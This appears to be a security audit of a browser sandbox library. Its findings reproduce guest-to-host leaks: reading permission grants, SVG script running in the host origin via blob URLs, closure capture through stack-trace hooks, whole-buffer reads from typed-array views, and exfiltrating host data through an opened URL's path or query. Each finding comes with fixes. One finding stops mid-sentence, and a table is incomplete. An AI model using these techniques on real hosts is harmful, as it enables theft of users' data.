#### <a id="bd5-iso-1"></a>BD5:ISO-1: a sealed guest reads the host origin's permission grants through `navigator.permissions` (WebKit, every view and worker mode; also cooperative mode on Chromium)

- **Severity**: high. The guest reads host-page state in the default configuration. It reads several low-entropy bits, on
  one engine for sealed mode. If the board counts the user agent's per-origin grants as host-page state, critical's
  wording ("reads host-page state ... in a default configuration") applies word for word. I rated it high because the state
  is the browser's per-origin record and not the page's DOM or storage, and because sealed mode gives the guest no way out
  except the embedder's exposed methods.
- **Effect**: data (read of host-page state).
- **Scope**: sealed (WebKit). Also strict and worker mode on WebKit, and cooperative mode on WebKit and Chromium (not sealed).
- **Class**: A, the host page's context that a sandbox document inherits. The missing row is "the browser's per-origin
  permission state of the host page". The chokepoint is the worker globals allowlist, so the finding also falls under the
  "browser's own bugs: the library removes the API" rule of THREAT-MODEL, Out of scope.
- **Where**:
  - `src/lib/worker-globals.ts:74`: `'Permissions', 'PermissionStatus'` are kept.
  - `src/lib/worker-globals.ts:103`: `WORKER_NAVIGATOR_MEMBERS` keeps `'permissions'`.
  - `src/lib/inherited-context.ts` has no row for the channel.
  - `docs/THREAT-MODEL.md:83-84` says that no remaining row "moves data in sealed mode".
  - `docs/research/24_sealed_mode/README.md:74` says "None moves data".
  - `docs/API.md:1151-1158` lists the kept globals and does not say what `navigator.permissions` reveals.
- **Concrete path**: the guest's entry calls `navigator.permissions.query({ name })`. The worker is a `blob:null` worker of
  the view, which is a srcdoc frame with an opaque origin. WebKit answers with the state the user agent holds for the host
  page's (top-level) origin. The library deletes neither the member nor the interface, so the guest reads:
  - `granted` for each permission the user granted the host site (geolocation, notifications, push);
  - `denied` for the others (camera, microphone, screen-wake-lock) once the host origin holds any grant;
  - `prompt` for each when it holds none.

  The host page's `Permissions-Policy: camera=(), microphone=(), geolocation=()` does not change the answer. The worker reads
  more than a plain sandboxed frame does on WebKit: the frame's document reads `geolocation: denied` and `camera: denied`
  whatever the grants are, while the worker reads `granted` and follows the host on all six. `PermissionStatus.onchange` is
  kept too, so the guest would also see a grant or a revocation as it happens. I expect that but did not run it.
- **Reproduction**: `test/e2e/p5-iso-permissions.spec.ts`. Two tests: the harness page, and the realistic host page
  (`RealisticHost`, `embed('sealed')`). Both configure the sandbox as an embedder does: `setConfig({ entry: 'main.js' })`,
  no baseline, no `scriptUnsafe`. The steps are: grant `geolocation` and `notifications` to the host origin, embed sealed
  mode, have the entry query six names, clear the grants, embed again and query again. The assertion is that the guest's
  two answers are equal. Results:
  - **WebKit**: fails. Harness page, with grants: `{"geolocation":"granted","notifications":"granted","push":"granted","camera":"denied","microphone":"denied","screen-wake-lock":"denied"}`.
    Without grants: `{"geolocation":"prompt","notifications":"prompt","push":"prompt","camera":"prompt","microphone":"prompt","screen-wake-lock":"prompt"}`.
    The realistic host page (CSP, Trusted Types, Service Worker, cookies, Permissions-Policy denying geolocation, camera
    and microphone) gives the same two values.
  - **Chromium**: passes. The guest reads `prompt` every time. The plain sandboxed frame control follows the grants
    (`geolocation: granted` with grants, `denied` without).
  - **Firefox**: passes. The guest reads `denied` every time.
  - **Extent across modes** (`test/e2e/p5-iso-probe2.spec.ts`, via `mount` and `inGuest`): the answers follow the grants on
    WebKit in cooperative, worker, strict and sealed mode, and on Chromium in cooperative mode. They do not follow the grants
    in worker, strict or sealed mode on Chromium, or in any mode on Firefox.
- **Engine difference**: not in the ledger (`src/lib/engine-ledger.ts` has no permissions row), and the API behaves
  differently on each engine: `prompt`, `denied`, or the host's real state.
- **Why the existing chokepoint and structural tests miss it**:
  - The worker allowlist was built to stop egress (class E-net: "the globals that can make a request"). Its tests
    (`worker-globals-and-termination.spec.ts` V1, V4 and the `worker-global-set` ledger test) check which names exist, what
    makes a request, and that `BroadcastChannel` does not cross. None checks that a kept name reads no state keyed to
    another origin.
  - `INHERITED_CONTEXT` lists what the documents inherit through the policy container, the base URL, cookies and similar
    channels, but not what the browser's per-origin stores answer an opaque realm with.
  - `realistic-host.spec.ts` and `sealed-no-network.spec.ts` look only at requests, cookies and violations.
- **Suggested fix (by construction)**:
  1. Remove `Permissions` and `PermissionStatus` from `WORKER_GLOBALS` and `permissions` from `WORKER_NAVIGATOR_MEMBERS`.
     No API that a permission gates exists in the worker (no geolocation, notifications, push or media), so the guest loses
     nothing it could use.
  2. Make the allowlist hold a second invariant: every kept name that reads browser state is listed with a measured answer
     that is the same with and without host-origin state (permissions, storage estimate, locks, IndexedDB enumeration).
  3. Add an `INHERITED_CONTEXT` row, `permissionState` ("the browser's per-origin state of the host page: permission grants
     and other stores an opaque realm may be answered from"), with `sealed: remains`, neutralised by `construct` (absent from
     the worker).
  4. Structural test: a unit test that fails when a WebIDL interface or navigator member on the allowlist is not classified
     (egress / state-read-measured / inert). The e2e property is this probe, inverted: for every state-read member, a host
     origin with and without the state gives the guest identical answers on all three engines, in every mode with a worker.
     That test is `p5-iso-permissions.spec.ts` with the assertion kept, plus `locks.query()`, `indexedDB.databases()` and
     `storage.estimate()`.
  5. For cooperative mode, document the residual: a cooperative guest document reads the grants on Chromium and WebKit, as
     the plain frame control shows.

#### <a id="bd5-iso-2"></a>BD5:ISO-2: `navigator.storage.estimate()` silently ends the guest's task on Firefox (an allowlisted member that differs by engine)

- **Severity**: low.
- **Effect**: no data effect.
- **Scope**: sealed (also strict and worker mode on Firefox; not run there).
- **Class**: B (a browser decision the allowlist assumes), recorded under ledger row `worker-global-set`.
- **Where**: `src/lib/worker-globals.ts:103` (`'storage'` kept in `WORKER_NAVIGATOR_MEMBERS`).
- **Concrete path**: on Firefox the sealed worker has `navigator.storage`; Chromium and WebKit have none (ledger
  `worker-global-set`). Calling `navigator.storage.estimate()` there neither returns nor throws a catchable error. The rest
  of the guest's task does not run: a `try`/`catch` around the call catches nothing and the statement after it does not run.
  No uncaught-error line reaches `sandbox-log`. The worker stays alive: a timer set before the call fires, and a later

#### <a id="bd5-chl-1"></a>BD5:CHL-1: the sealed-app recipe keeps no app's state apart from another's

- **Severity:** medium (a docs example that leads an embedder into a leak; rated like BD4:NEW-2).
- **Effect:** data (docs-led). One guest reads another guest's saved data, and can overwrite it.
- **Scope:** sealed (the default; the recipe is the sealed-mode recipe, and `guestWrites: true` is a sealed opt-in).
- **Class:** none of the code classes. It is the docs' example. The nearest class is A/D: state that outlives the
  environment and has no per-app key.
- **Where:**
  - `examples/sealed-app/host.js:2` takes `bundle` as a parameter.
  - `examples/sealed-app/host.js:12-19` exposes `save` on the element.
  - `examples/sealed-app/host.js:18` and `:22` read and write the fixed key `'todos'`.
  - `docs/API.md:1513-1520` says an app is "a bundle the user saved".
  - `docs/API.md:1660-1671`, "Saving the app's state", gives two routes:
    - `save` into the page's store;
    - `commitGuestWrites()` into the element's files, "where the app reads them with `sandboxFiles.text()`".
  - `docs/API.md:1056-1058` says host-exposed methods and registered files are kept across a rebuild.

**The path.**
1. An embedder follows the recipe for the bundles its users saved.
2. `mountTodoApp(sandbox, { bundle, store })` is parameterised by the bundle. It saves every bundle's state under the
   page-wide key `'todos'`, and hands that key's value to whatever bundle it mounts next (`call('load', …)`).
3. The second route has the same gap. Committed writes become the element's registered files, and those are kept across
   a rebuild (`API.md:1058`). The next bundle on the same element lists and reads them with `sandboxFiles`.
4. The `save` method also stays exposed to every later guest on the element.
5. So a second, hostile bundle mounted the documented way receives the first app's state and can overwrite it. The docs'
   own security note asks for "a destination you fixed (this app's own storage key …)" (`API.md:1652`), but the example
   does not keep it.

**Reproduction.** `test/e2e/zz-p5chl-recipe.spec.ts` (Chromium; the logic is the host page's, so no engine differs):
1. It mounts the todo bundle through `host.js` with a store that holds `[{ text: 'call bank, PIN 4711' }]`.
2. It registers `state.json`, standing in for a committed state write.
3. It then mounts a second bundle through the same `mountTodoApp` on the same element and store.

Output:
```
OTHER-APP load received [{"text":"call bank, PIN 4711","done":false}]
OTHER-APP files ["app.css","app.js","logo.png","state.json"]
OTHER-APP state.json {"secret":"todo app state"}
  ✓  1 [chromium] › test/e2e/zz-p5chl-recipe.spec.ts … (1.3s)
```

**Why the existing checks miss it.**
- `test/e2e/sealed-app.spec.ts` runs the recipe with exactly one bundle. Its test 4 checks that the stored state comes
  back to the next mount, which is the leak once the next mount is another bundle.
- `docs:check` only keeps the docs equal to the files. Nothing reviews the example as an embedder pattern.

**Suggested fix.**
- Make the example per app by construction:
  - key the store by the bundle (`store.setItem(\`todos:${bundle}\`, …)`), or take an `appId`;
  - give each app its own element, or call `unregisterFiles()` and drop the methods (`expose` replaced by a refusal)
    before mounting another bundle;
  - say in "Saving the app's state" that the element's files and exposed methods belong to the element, not to the
    app: committed state is readable by every later guest on that element.
- Structural test: extend `sealed-app.spec.ts` with a second, hostile bundle mounted through the same `host.js`. It must
  receive neither the first app's state nor its committed files. That fails against the current example.

#### <a id="bd5-chl-2"></a>BD5:CHL-2: guest bytes made into a `blob:` URL by the host page run as the host page when opened

- **Severity:** medium (docs-led). The effect, script in the host page's origin, would be critical. It needs the
  embedder's own code and a user's click, and the docs never warn about it.
- **Effect:** data (docs-led). The guest reads the host page's storage and cookies and acts as the host page.
- **Scope:** sealed. With `guestWrites` (an in-scope sealed opt-in) through `listGuestWrites()`. In the default config,
  through a `Blob` or `File` that a guest method returns to `call()`.
- **Class:** none of the code classes. It is a docs gap at the API's output boundary, where the embedder takes the
  guest's bytes.
- **Where:**
  - `docs/API.md:1207-1210` (Guest writes): "show [path and type] with `textContent`, never in an HTML, URL, template or
    `console` format-string sink". Nothing is said about the content.
  - `src/lib/guest-writes.ts:82` (the `GuestWrite` remarks): the same, for path and type only.
  - `docs/API.md:1646-1658` (the recipe's security note): text sinks only.
  - `docs/API.md:1673-1690` ("Images the app makes") invites the app to produce images. It says nothing of showing them
    outside the view.
  - `docs/API.md` `call()` remarks: a result may be a `Blob` or `File`, whose `type` is the guest's.

**The path.**
1. A sealed guest writes `chart.svg`. Its type is `image/svg+xml` from the extension table, and the guest may also give
   any type itself. The SVG holds a `<script>`.
2. The embedder shows "the images the app makes" in its own page, as the docs' image section suggests apps do. It uses
   `URL.createObjectURL(new Blob([w.content], { type: w.type }))` as an `<img>`, wrapped in a "full size" link.
3. The `<img>` is inert. Opening the URL top level makes the SVG a document of the host page's origin, and its script
   runs there. The ways to open it are the link, the user's "open image in new tab", an `<iframe>` or `<object>`, or
   `location`.
4. The same holds for a `Blob` the guest returns to `call()`, and for a blob made with no type, which engines sniff.

**Reproduction.** `test/e2e/zz-p5chl-written-bytes.spec.ts`:
1. A sealed guest (no `scriptUnsafe`, `guestWrites: true`) writes `chart.svg`.
2. The host page makes a thumbnail link from `listGuestWrites()`, as above.
3. The test clicks the link.

On all three engines, the opened document has the host page's origin and reads its `localStorage`:
```
OPENED blob:http://localhost:22259/b015… "RAN in http://localhost:22259 read session-token-123"   ✓ [chromium]
OPENED blob:http://localhost:22259/0a6a… "RAN in http://localhost:22259 read session-token-123"   ✓ [firefox]
OPENED blob:http://localhost:22259/5a9e… "RAN in http://localhost:22259 read session-token-123"   ✓ [webkit]
```

**Why the existing checks miss it.**
- The library's own chokepoints for guest bytes are sound inside the sandbox:
  - `INERT_TYPES` for commits;
  - `VIEW_FILE_TYPES` and `VIEW_WRITE_TYPES` in the view, which mints raster types only.
- The API also hands the same bytes, with the guest's type, to the host page (`listGuestWrites().content`, `call()`
  results). No docs row and no test covers what the embedder may safely do with them.

**Suggested fix.**
- Docs:
  - in Guest writes, in the recipe's security note and in `call()`'s remarks, state that guest bytes become a document
    of your origin when you make a URL of them;
  - show them only through the `download` attribute, or as an `<img>` of a raster type you set yourself (never the
    guest's `type`). Never use `target=_blank`, `<iframe>`, `<object>`, `location` or a typeless `Blob`.
  - give a safe example for "show the app's image on your page".
- By construction, optional: expose the content of a non-raster write only with a neutral type
  (`application/octet-stream` with `download` semantics), or add a helper that returns a URL only for
  `VIEW_WRITE_TYPES`.
- Structural test: a docs check that every public API returning guest bytes (`GuestWrite.content`, `call()` results)
  carries the note, plus this probe as an e2e guard of the helper if one is added.

#### <a id="bd5-chl-3"></a>BD5:CHL-3: on V8, guest code takes the prelude's and the broker's closures through `Error.prepareStackTrace`

- **Severity:** low.
- **Effect:** no data effect. It is availability-adjacent only where Chromium puts the view on the host page's thread
  (not desktop site isolation).
- **Scope:** sealed. V8 only: Chromium, and Chrome on Android.
- **Class:** G (guest-controlled state consulted while library code runs). The capture lists end with `CAPTURE_POINT`,
  "nothing below reads a global, or an intrinsic guest code can replace". V8 itself consults `Error.prepareStackTrace`,
  a global the guest sets, and hands it `CallSite`s whose `getFunction()` returns any sloppy-mode function on the stack.
  The stringified library code (`inStrictWorker`, `inSandboxScript`, `createBroker`) runs as classic sloppy script, so
  its closures are handed out.
- **Where:**
  - `src/host.ts:2385-2392` (`_getStrictWorkerSource`): the functions are stringified into a classic worker script with
    no `'use strict'`.
  - `src/lib/in-sandbox-view.ts:3546-3609` (`dispatch`, `onRenderMessage`).
  - `src/lib/rpc.ts:655-671` (the request's `then` callback).

**The path.** A guest handler that `sandboxView.on()` registered, or a method that `bridge.expose()` published, runs
below library frames. With `Error.prepareStackTrace = (e, s) => s`, `new Error().stack` gives `CallSite`s.
`getFunction()` returns the prelude's `dispatch` and `onRenderMessage`, and the broker's request callback. Calling
`onRenderMessage(new MessageEvent('message', { data: { type: 'VIEW_ACK' } }))` releases the prelude's next queued
operation without the view's acknowledgement, which defeats the one-in-flight flow control of the render port.

**Reproduction.** `test/e2e/zz-p5chl-callsites.spec.ts` (Chromium):
```
RPC ["grab:function:","?:function:","?:function:"]
EVENT ["grab:function:","?:function:","dispatch:function:","onRenderMessage:function:"]
ONRENDER function
```

**Why it has no data effect.**
- No closure that posts raw frames on the logic port (`send`, `respond`) is ever on the stack below guest code. The
  snapshot is posted after any guest code has run.
- The host re-counts everything it receives (boundary 4).
- The view checks every render-port frame again, and its time budget and overrun judge still apply.
- So the reach is the guest's own flow control and its own handlers. On desktop Chromium the view is in another process.
  On a Chromium build without isolated sandboxed frames (Android), the flood of single, size-checked operations would
  land on the host page's thread. That case was not measured.

**Why the existing check misses it.** `test/unit/bootstrap-capture-and-measure.test.ts` scans the text for global and
intrinsic lookups after `CAPTURE_POINT`. An engine hook that the guest installs and the engine invokes is not a lookup
in the text.

**Suggested fix.** Make every stringified library function strict-mode code. V8 returns `undefined` from `getFunction()`
and `getThis()` for strict frames. Two ways:
- prefix the generated worker, view and bridge sources with `'use strict';`;
- or start each stringified function's body with the directive.

Structural test: extend the capture scan to require the directive at the head of each stringified source, plus this probe
on Chromium (no library function name among the frames that `getFunction()` returns).

#### <a id="bd5-lim-1"></a>BD5:LIM-1: a typed-array view passed to the app crosses with its whole `ArrayBuffer`, so the app reads host bytes outside the view the host returned or sent

- **Severity:** medium. This is a docs gap that leads an embedder into a leak. The library could also close it by construction. It is not high, because the embedder has to hand over a view of a larger buffer.
- **Effect:** data. Host-page bytes the embedder did not give reach guest code.
- **Scope:** sealed mode (the default), and every mode. There are no options: it holds for `expose()` results and for `call()` arguments.
- **Class:** none of research 18's eight rows fits exactly. The nearest is **P** ("what crosses is not what the API shows"): `structured-size.ts` already counts "a typed array or a DataView: its whole buffer, which clone copies", so the measure knows this, and the docs for embedders do not say it. I propose a row of its own: *a value the host hands the guest crosses as what it shows*.
- **Where:**
  - `src/lib/rpc.ts`, `createBroker`:
    - `request()`: `sendableArgs = clone(args)`, then `requestFrame(...)`, then `send(frame)`.
    - `sendResult()`: `snapshot = clone(value)`, then `resultFrame(...)`, then `respond(frame, buffers)`, with the host's `transferResults` set. The whole underlying buffer is transferred to the guest.
  - The measure: `src/lib/structured-size.ts:25` ("its whole buffer"), which agrees with the behaviour.
  - The docs that frame the contract:
    - `docs/API.md:1637`: "Arguments and results are copied (structured clone, not transferred)".
    - `docs/API.md:1646-1658`: the "App to host" security note, which is about the app's arguments only.
    - `docs/API.md:1673-1678` ("Images the app makes"): "…or the host sends bytes with `call()` and the app writes them".
    - `docs/API.md:572-590` (`expose`): says nothing about what a result carries.
- **The path:**
  1. The host keeps bytes in one `ArrayBuffer`. Examples: a decoded archive, a sprite atlas, a record buffer, or a buffer it reuses for I/O.
  2. It hands the app a slice by view: `return buf.subarray(a, b)` from an exposed method, or `sandbox.call('push', buf.subarray(a, b))`. The second is the docs' "host sends bytes with `call()`" pattern.
  3. `rpc.ts` takes `clone(value)`. Structured clone of a `Uint8Array` serializes its whole `ArrayBuffer`, plus the offset and length. The host broker then transfers that cloned buffer.
  4. In the worker, `view.buffer` is the whole buffer. Guest code reads every byte outside `[a, b)`.
  5. In sealed mode the host is the app's only way out, so this is exactly the surface the docs tell embedders to guard. The guard they describe (validate arguments, copy what you expect) is about inbound data and does not cover this.
- **Reproduction:** `bunx playwright test test/e2e/probe-bd5-lim.spec.ts --project=<engine>`, run with no `mode` (sealed).
  - The host fills a 4096-byte buffer with `PUBLIC-` followed by a "secret".
  - It returns `buffer.subarray(0, 7)` from `expose('chunk')`, and passes the same view to `call('take', …)`.
  - The output is the same on Chromium, Firefox and WebKit:

  ```
  PROBE BD5:LIM-1 {"mode":"ready","got":[{"dir":"host->app call arg","viewLength":7,"bufferLength":4096,"outside":"PUBLIC-xxxxxxxxxxxxxxxxHOST-SECRET-session=abc123;user=alice@example.com"},[{"dir":"host result","viewLength":7,"bufferLength":4096,"outside":"PUBLIC-xxxxxxxxxxxxxxxxHOST-SECRET-session=abc123;user=alice@example.com"}, …]]}
  ```

  Both directions hold on all three engines, and the sandbox stays `ready`.
- **Why the chokepoint and its tests miss it:**
  - The RPC chokepoint bounds **how much** crosses: `RPC_MAX_BYTES`, the snapshot measure and the builders. It bounds that correctly, counting the whole buffer.
  - Nothing states or tests **what** crosses compared with what the value shows.
  - `test/unit/rpc.test.ts` and `broker.spec.ts` check cloning, transfer and size, never that a view crosses as its own bytes.
  - The S25 row (own `__proto__`) is the only "what structured clone carries beyond the obvious" item in the backlog, and it covers the inbound direction.
- **Suggested fix (by construction):**
  1. **Chokepoint:** in `createBroker`, after the snapshot `clone()` in `request()` and in `sendResult()`, walk the snapshot once. That walk already exists in `sizeOf`, which visits every buffer. Replace every typed array or `DataView` whose `byteOffset !== 0` or whose `byteLength !== buffer.byteLength` with a compact copy of its own bytes. Two views of one buffer then become two buffers. That matches what they show, and the clone of the clone is gone.
  2. **Alternative:** do this on the host broker only. Its `send` and `respond` are the host-to-guest direction, and a helper passed in like `sizeOf` would avoid touching the stringified code.
  3. **Structural test:** a property test over random nestings, of every value the host's broker posts, both requests and results. For each typed array or `DataView` in the posted frame, assert `buffer.byteLength === byteLength` and `byteOffset === 0`.
  4. **E2E:** a row like the probe in `channel-isolation.spec.ts`, on three engines.

#### BD5:NEW-1: CONFIRMED-WITH-CHANGES (data, docs-led, sealed). Severity: medium, not high

##### 1. Does the leak hold?

Yes. `v5-open.spec.ts` sets things up as follows:
- It takes the guard from docs/API.md:1347-1361 as written.
- It runs that guard in a sealed app on the harness page.
- It routes `https://example.com/**` to capture what the opened tab requests.
- The app's handler for `click` on a plain `<p id="para">` (not a link) calls `bridge.call('openExternal', 'https://example.com/' + enc(notes) + '?q=' + enc(notes))`. Here `notes` is host data the app got through `load`.

The guard admits the address. The tab requests:

```
https://example.com/SECRET-NOTE%20customer%3Dalice%40example.org?q=SECRET-NOTE%20customer%3Dalice%40example.org
```

- It does this on Chromium (the full build, new headless, popup blocker on), Firefox (`dom.disable_open_during_load: true`) and WebKit.
- The payload can go in the path as well as the query. The fragment also passes the guard: the server never sees it, but the opened page's script can read it.
- The bound is 2048 characters per open.

The existing test pins the leaky behaviour as intended: `test/unit/attacker-text-docs.test.ts:104` asserts that `https://example.com/docs?a=1#b` is opened.

##### 2. Is a user click a realistic precondition?

Yes, and it is a weaker one than "a click on the app's link".

- **No click: blocked.**
  - A call made more than 5 s after any gesture is blocked on Chromium (full build) and on Firefox. The guard passed it and `window.open` ran, but no request was made.
  - Measurement caveat: Playwright's `page.evaluate` and frame evaluates carry a user gesture, so the probe waits until those expire.
  - Playwright's own Chromium headless shell and its WebKit do not block popups. On those, the no-click open went out too. That is a test-harness artefact, not what users run.
- **Any real click anywhere in the view: one tab opens.**
  - The click activates the view frame, and the activation propagates to the host page: `navigator.userActivation.isActive` was true in the host when the call arrived.
  - On Chromium and Firefox, `window.open` then consumes the activation, so it is one tab per click.
  - The app chooses which click to use: "Add todo", a checkbox, a pointerdown. It also has about 5 s after the click to choose.
- **The open is visible.** A new tab shows the payload in its address bar.

##### 3. Is it a docs gap that leads an embedder into a leak? At what severity?

It is a docs gap that leads to a leak. Three things in the docs point there:
- The sealed section's only answer to "Open a link or a window" (API.md:1700) is this guard.
- The security note (API.md:1651-1653) presents the guard as the safe way.
- The guard was written against "a URL is code" and is blind to "a URL is a payload".

It is **medium**, not high:
- It needs a user click per exfiltration.
- Each open is visible (a new tab, with the data in the URL).
- At most 2 KiB leaves per open.
- The attacker must be able to read requests to an origin the embedder listed.

That last condition is commonly met: the listed origin is the app vendor's own site ("link to our homepage or support"), or it has an open redirect, or it hosts user content whose pages run script that reads `location`. If the board counts "the listed origin is the app author's" as the default case, that argues for high. I would not grade above medium given the visible, per-click shape.

##### 4. Minimal by-construction fix

The app chooses a key. The host's own table holds the URL, so no text of the app's ever reaches `window.open`. This is the board's first option. Use a `Map`, so `__proto__`, `constructor` and `toString` cannot hit an inherited property.

**Docs text.** This replaces API.md:1342-1361 from "To open external URLs…". The table row at :1700 and the bullet at :1651-1653 then point here.

> To open an external page, expose a host method and call it from a click handler. **An address you open is a request your page makes, and every part of it (path, query, fragment) can carry the app's data to that server**, so the app never supplies the address: it names one of a fixed set of links, and your page holds the addresses. (Opening text the app wrote, even after checking its scheme and origin, lets the app send what it holds to that origin in the path or query, one tab per click.)
>
> ```js
> const LINKS = new Map([ // every address the app may open, written by you
>     ['docs', 'https://example.com/docs'],
>     ['help', 'https://example.com/help'],
> ]);
> sandbox.expose('openExternal', (name) => {
>     const href = typeof name === 'string' ? LINKS.get(name) : undefined;
>     if (href === undefined) throw new Error('openExternal: unknown link');
>     window.open(href, '_blank', 'noopener');
> });
> // in the worker: sandboxView.on('click', 'docs', () => bridge.call('openExternal', 'docs'));
> ```
>
> What is left to the app is which of your links it opens and when: a few bits per user click. Never build the address from the app's text, and do not list an address whose server forwards its query (a redirector).

**Test.** This replaces the openExternal block in `test/unit/attacker-text-docs.test.ts`. It still extracts the snippet from API.md and runs it with stubbed `sandbox` and `window`.
- **By construction:** for a fuzz set, every `window.open` href is one of the snippet's `LINKS` values. Read those values by running the snippet with every key. The fuzz set is:
  - each key;
  - each key with `?x`, `#x` or `/x` appended;
  - `https://example.com/docs?x=1`;
  - `__proto__`, `constructor`, `toString`, `hasOwnProperty`;
  - `''`;
  - non-strings, including an object with `toString`;
  - 1000 random strings.
- **No echo:** no href ever contains a substring of the argument that is not already in the table value.
- **No resolve, no echo:** the snippet's source never passes its argument to `new URL` or `window.open`. This is a source scan: the parameter's name does not occur in the `window.open(` call.
- Delete the current assertion that a query and fragment are opened.

#### BD5:LIM-1: CONFIRMED on three engines (stronger than filed). Data, every mode. Severity: medium

##### 1. Confirmation on three engines, with a control

Run with `v5-lim.spec.ts`, sealed by default. The host fills 64 bytes with `PUB` followed by `HOST-SECRET-token=abc123`.

Identical on Chromium, Firefox and WebKit, in both directions (expose result and `sandbox.call` argument):
- The leak holds at any depth. Each case reads `bufferLength 64` plus the secret:
  - `subarray(0,3)`
  - `new DataView(buf,0,3)`
  - `new Uint8Array(buf,0,3)`
  - a view nested in an object or array
  - a view as a `Map` value or a `Set` member
  - two views of one buffer (they also arrive sharing one buffer: `sameBuffer=true`)
  - a `Float64Array` subarray
- The control, `slice(0,3)`, arrives as a 3-byte buffer.
- The host's buffer is intact afterwards: only the snapshot is transferred.

**Realistic case, stronger than the report.** Emscripten modules hand results out as `HEAPU8.subarray(ptr, ptr + len)`. Returned from a host method, a 3-byte result crossed as the module's whole **16 MiB heap**, with other data at offset 1024 readable (Chromium, `wasmHeap` row). The sealed table (API.md:1699) tells embedders to do exactly this: "run the module in your page and pass the results with `call()`". The 33 MiB budget is the only cap. A larger heap is refused as over budget, which is itself a surprise for a 3-byte result.

##### 2. Library defect or embedder misuse?

Library, with a docs gap:
- The docs promise a copy of the value (API.md:606, :1637). They never say that a view carries its whole buffer.
- They actively route bytes and WebAssembly results through `call()` (:1678, :1699).
- The library knows this behaviour: `structured-size.ts:25` counts "its whole buffer".
- It is fixable in one chokepoint, the broker's snapshot.

postMessage veterans may know the semantics, but the library defines its own "copied" contract and should make it true.

##### 3. Severity, against "Building an app in sealed mode"

Medium. It is a real leak of host bytes the embedder did not give, reached by following the sealed section's own advice. It is not high because the host must hand over a view of a larger buffer. That is common for WebAssembly, pooled or I/O buffers, and parsers that return `subarray`. It could be argued high for a host whose one module heap serves several apps or documents.

##### 4. The fix: is it sound and complete?

Compact every partial view in the snapshot. This is sound and complete for this class, with these points:

- **Order.**
  - Compact after `clone()` and **before** the measure, in both `request()` (`sendableArgs`) and `sendResult()` (`snapshot`). Then "what is measured is what is posted" (S77) still holds.
  - The `buffers` list then holds only compacted buffers.
  - Compacting first matters for size. N overlapping partial views of one buffer used to count the buffer once. After compaction they count N times, and only a measure taken after compaction sees that.
- **How.**
  - The snapshot is the broker's own fresh graph, so it can be rewritten in place.
  - Walk it with a seen-set, so cycles terminate.
  - Map each view **object** to one replacement, so `[v, v]` stays one view. Identity between the two references is kept; only buffer sharing between distinct views is lost.
  - Replace object properties, array elements, and `Map` **keys** and values. A view can be a Map key, so rebuild the Map in order. Rebuild `Set`s the same way.
  - Leave a view that already covers its whole buffer (`byteOffset 0`, `byteLength == buffer.byteLength`) as it is.
  - Copy with captured intrinsics (`new ArrayBuffer(n)` plus a captured `Uint8Array.prototype.set`). Do not use `slice`, which reads the `Symbol.species` of the realm. That matters on the guest broker, which is stringified into the guest.
  - The code is shared, so apply it in both directions. Only host to guest matters for confidentiality, and the guest to host direction is harmless.
- **Blob and File: no change needed.** `new Blob([buf]).slice(0,3)` arrives as `size 3`, `"PUB"`, on all three engines.
- **SharedArrayBuffer:**
  - Chromium and Firefox refuse it (`RESULT_NOT_TRANSFERABLE`). Without COI, `structuredClone` throws.
  - **WebKit without COI copies it.** A view of a shared `WebAssembly.Memory` buffer clones to a plain `ArrayBuffer` of 64 KiB. It is not live: a host write after the crossing was not seen. So it crosses with the whole page, and compaction covers it, since by then it is a plain buffer.
  - This is an engine difference the ledger should list, because the measure's comment says a SharedArrayBuffer is never measured.
  - `SharedArrayBuffer` is undefined on WebKit without COI. The probe used shared wasm memory.
- **Resizable buffers:** a length-tracking full view is left as it is, and a partial one is compacted to a fixed-length buffer. Both are acceptable.
- **Is losing identity acceptable?** Yes. The contract is "copied", and nothing in the API promises aliasing across the boundary. Document it: "each typed array or DataView arrives with a buffer of its own bytes; views that shared a buffer no longer do".
- **Structural test:**
  - **Unit:** a property test over `createBroker` with recording `send` and `respond`. It generates random nestings (objects, arrays, Map keys and values, Set members, cycles) holding partial `Uint8Array`, `Float64Array` and `DataView` views, at odd offsets, plus a repeated view object. For every view in every posted frame and transfer list, it asserts:
    - `byteOffset === 0`
    - `byteLength === buffer.byteLength`
    - the bytes equal the source view's
    - a repeated view object is still one object
    - the measured size equals the size of the frame as posted
  - **Source scan:** every `send`/`respond` of a request or result frame in `createBroker` takes a value that went through the compaction.
  - **E2E:** the `v5-lim` matrix, including the wasm heap row, as a row of `channel-isolation.spec.ts` on three engines. It asserts `view.buffer.byteLength === view.byteLength` in the guest.
- **Docs:** one line at :1637 and under `expose()`/`call()`: a view arrives with its own bytes only.

##### LIM-2: an engine error thrown in a host method

The host handler throws on `HOSTSECRET42`. These cases put that host data in the `HANDLER_ERROR` text the app reads:

| Engine | Cases that quote the host data |
| :--- | :--- |
| Chromium | `JSON.parse`, `BigInt`, a null property read (`reading 'HOSTSECRET42'`), `TextDecoder` label, `RegExp` source, `querySelector` |

| WebKit | `JSON.parse`, `new URL`, `querySelector` |

- The texts differ by engine, so this is also a ledger gap.
- `expose()` docs (:579-581) say "wrap the handler", but the app guide (:1658) says "the message you threw".
- The data is small: what the engine quotes, often the whole input.

##### DOC-1: a result that cannot be cloned

- **Chromium** sends the function's source text: `result is not transferable: … refresh() { return 'HOSTSECRET42-in-source'; } could not be cloned.` It also does so for `function HOSTSECRET42fn() {}` returned inside a `try`.
- **Firefox** sends a generic `Function object could not be cloned.`
- **WebKit** sends `The object can not be cloned.`
- **Wrapping does not help.** The failure happens after the handler returned (rpc.ts:536-538).

**Why low, not medium:**
- What leaks is **source text**, not closure values. Host JavaScript source is normally served to every visitor, so the app author can read it anyway. A secret leaks only when it is inlined into per-user script, for example a server-templated token.
- A method that always fails is noticed in development. The realistic exposure is one where the app selects which object is returned.
- Chromium only.

##### One rule for both (it covers both)

**The library never forwards an engine's own error text from the host side to the app.** Applied at the chokepoint where refusal texts are made (rpc.ts `failed()` :637 and `sendResult` :538/:551):

- **Refusals the library makes** (`RESULT_NOT_TRANSFERABLE`, `BUSY`, `UNKNOWN_METHOD`, the budget texts): a fixed text per code. For example, `result is not transferable: it holds a value structured clone cannot carry`, plus `pastBudget`'s kind name from the measure, which is already the library's own text.
- **HANDLER_ERROR:**
  - Forward the message only when the thrown value is a string, or an error whose prototype is exactly the captured `Error.prototype` (a plain `new Error(text)`: the embedder's own text, and the form the docs' own examples throw).
  - Any other kind gets a fixed text naming only the kind (`the host method failed (SyntaxError)`). That covers SyntaxError, TypeError, RangeError, ReferenceError, URIError, AggregateError, DOMException, the WebAssembly errors and Firefox's `InternalError`, from any realm. This is FR:F3's rule ("the name, never the message"), applied to embedder handlers.
